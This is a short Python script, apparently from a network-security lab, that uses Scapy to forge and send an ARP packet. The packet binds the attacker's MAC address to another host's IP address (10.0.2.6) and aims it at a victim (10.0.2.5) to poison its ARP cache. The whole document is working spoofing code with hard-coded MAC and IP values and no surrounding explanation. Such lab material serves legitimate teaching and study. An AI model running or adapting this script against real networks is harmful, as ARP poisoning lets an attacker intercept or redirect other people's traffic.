# Mapping the attacker's MAC address with Clone 2's IP and sending to Clone 1's ARP cache
#!/usr/bin/python3

from scapy.all import *

E = Ether( dst = '08:00:27:e1:cc:0b', src = '08:00:27:55:5d:82')
# Attacker MAC with Clone 2's IP Address
A = ARP( hwsrc = '08:00:27:55:5d:82', psrc = '10.0.2.6', 
# Destination cache to Clone 1's MAC & IP Addresses
	   hwdst = '08:00:27:e1:cc:0b', pdst = '10.0.2.5' )

pkt = E/A
pkt.show()
sendp(pkt)